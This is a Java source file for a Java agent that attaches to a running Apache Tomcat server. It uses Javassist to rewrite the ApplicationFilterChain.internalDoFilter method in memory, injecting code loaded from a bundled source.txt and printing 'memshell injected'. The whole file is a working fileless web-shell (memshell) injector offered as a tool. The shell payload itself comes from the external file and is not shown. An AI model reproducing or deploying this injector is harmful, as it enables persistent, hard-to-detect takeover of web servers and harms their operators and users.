package forTomcat1;

import forTomcat1.Agent;
import javassist.*;

import java.io.*;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;

public class Agent {
    public static void agentmain(String angentArgs, Instrumentation inst) {
        Class cLasses[] = inst.getAllLoadedClasses();
        for (Class c:cLasses
             ) {
            if (c.getName().startsWith("org.apache.catalina.core.ApplicationFilterChain")){
                System.out.println("find a classs:"+c.getName());

                try {
                    ClassPool cp =ClassPool.getDefault();
                    ClassClassPath ccp = new ClassClassPath(c);
                    cp.insertClassPath(ccp);
                    CtClass ctClass =cp.get("org.apache.catalina.core.ApplicationFilterChain");
                    CtMethod ctMethod = ctClass.getDeclaredMethod("internalDoFilter");
                    if (!getshellstring().equals("no get shell")) {
                        ctMethod.insertBefore(getshellstring());
                        ctClass.detach();
                        byte[] bytes = ctClass.toBytecode();
                        ClassDefinition definition = new ClassDefinition(c, bytes);
                        inst.redefineClasses(new ClassDefinition[]{definition});
                        System.out.println("memshell injected");
                    }
                    else {
                        System.out.println("not get shellcode");
                    }

                }catch (Exception e){
                    System.out.println("fiaed at getclasssbytes"+e);
                }
            }
//            else {
//                System.out.println("not find org/apache/catalina/core/ApplicationFilterChain");
//            }
        }
    }
    public static String getshellstring() {
        StringBuilder source=new StringBuilder();
        InputStream is = Agent.class.getClassLoader().getResourceAsStream("source.txt");
        try {

            try(InputStreamReader isr = new InputStreamReader(is);
                BufferedReader br = new BufferedReader(isr)
            ) {
                String line = null;
                while ((line = br.readLine()) != null) {
                    source.append(line);
                }
                return new String(source);
            }

        }catch (Exception e){

            System.out.println(e);
            return "no get shell";
        }

    }
}
